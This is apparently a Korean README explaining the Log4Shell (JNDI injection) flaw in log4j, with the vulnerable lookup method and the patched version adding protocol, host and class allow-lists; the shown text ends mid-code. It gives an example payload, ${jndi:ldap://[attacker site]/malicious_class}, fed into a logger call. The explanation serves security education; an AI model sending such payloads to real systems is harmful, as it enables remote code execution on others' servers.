# log4j-explain
log4j는 전 세계적으로 인기있는 logging library로 Mincraft, Apple iCloud, Apache, Twitter, Steam, Amazon, Tesla 등 현재 수많은 소프트웨어에서 사용되고 있습니다. 이러한 log4j에서 원격 코드 실행이 가능한 JNDI Injection 취약점이 발견되었습니다.

해당 취약점의 이름은 log4shell로 명명되었으며 log4j를 사용하는 소프트웨어 대부분을 공격 가능한 높은 파급력과 비교적 간단하다는 점 때문에 취약점의 위험성을 평가하는 지표인 cvss 점수의 최고점 10.0이 부여되었습니다. log4shell 취약점의 영향을 받는 소프트웨어는 링크에서 확인할 수 있으며, 2021/12/12 기준 지속적으로 업데이트되고 있습니다.



**취약점은 JndiManager.java 의 JNDI lookup 기능에서 발견되었습니다.**

```java
public <T> T lookup(final String name) throws NamingException {
        return (T) this.context.lookup(name);
}
``` 
        
JNDI(Java Naming and Directory Interface)는 자바 애플리케이션에서 외부 디렉터리 서비스에 접근하기 위한 API로, 원격지 서버의 객체를 바인딩해 애플리케이션에서 접근할 수 있는 기능입니다. 이러한 외부 디렉터리 서비스 프로토콜은 대표적으로 LDAP(Lightweight Directory Access Protocol)과 LDAPS(Secure LDAP)이 있습니다.

해당 lookup 기능의 name 매개변수에 ${jndi:ldap://[attacker site]/malicious_class} 와 같이 해커가 제어하는 서버의 악성 클래스 경로를 전달하게 되면 lookup은 ${} 안의 내용을 파싱해 실행합니다. 이때 JNDI:LDAP 프로토콜로 접근하는 외부 디렉터리 서비스에 대한 검증이 존재하지 않아 해커의 악성 클래스를 바인딩하게 되고 악성 클래스에 포함된 임의 코드를 원격에서 실행할 수 있습니다.

```java
String userInput = "${jndi:ldap://[attacker site]/malicious_class}";
logger.info("log {} ", userInput)
```
        
위와 같이 취약한 서버가 log4j를 통해 request와 같은 user input을 기록하는 경우 원격 코드 실행이 트리거 됩니다.

JNDI와 JNDI Injection은 [하루한줄] CVE-2021-2109 : 오라클 Weblogic Server 원격 코드 실행 취약점에서도 활용되었습니다.

패치는 lookup의 매개변수 name에 전달되는 프로토콜 및 ldap 서버, 클래스에 대한 필터를 추가하는 코드를 추가하는 것으로 이루어졌습니다.

```java
public synchronized <T> T lookup(final String name) throws NamingException {
        try {
            URI uri = new URI(name);
            if (uri.getScheme() != null) {
                if (!allowedProtocols.contains(uri.getScheme().toLowerCase(Locale.ROOT))) {
                    LOGGER.warn("Log4j JNDI does not allow protocol {}", uri.getScheme());
                    return null;
                }
                if (LDAP.equalsIgnoreCase(uri.getScheme()) || LDAPS.equalsIgnoreCase(uri.getScheme())) {
                    if (!allowedHosts.contains(uri.getHost())) {
                        LOGGER.warn("Attempt to access ldap server not in allowed list");
                        return null;
                    }
                    Attributes attributes = this.context.getAttributes(name);
                    if (attributes != null) {
                        // In testing the "key" for attributes seems to be lowercase while the attribute id is
                        // camelcase, but that may just be true for the test LDAP used here. This copies the Attributes
                        // to a Map ignoring the "key" and using the Attribute's id as the key in the Map so it matches
                        // the Java schema.
                        Map<String, Attribute> attributeMap = new HashMap<>();
                        NamingEnumeration<? extends Attribute> enumeration = attributes.getAll();
                        while (enumeration.hasMore()) {
                            Attribute attribute = enumeration.next();
                            attributeMap.put(attribute.getID(), attribute);
                        }
                        Attribute classNameAttr = attributeMap.get(CLASS_NAME);
                        if (attributeMap.get(SERIALIZED_DATA) != null) {
                            if (classNameAttr != null) {
                                String className = classNameAttr.get().toString();
                                if (!allowedClasses.contains(className)) {
                                    LOGGER.warn("Deserialization of {} is not allowed", className);
                                    return null;
                                }
                            } else {
                                LOGGER.warn("No class name provided for {}", name);
                                return null;
                            }
                        } else if (attributeMap.get(REFERENCE_ADDRESS) != null
                                || attributeMap.get(OBJECT_FACTORY) != null) {
                            LOGGER.warn("Referenceable class is not allowed for {}", name);
                            return null;
                        }
                    }
                }
            }
        } catch (URISyntaxException ex) {
            // This is OK.
```
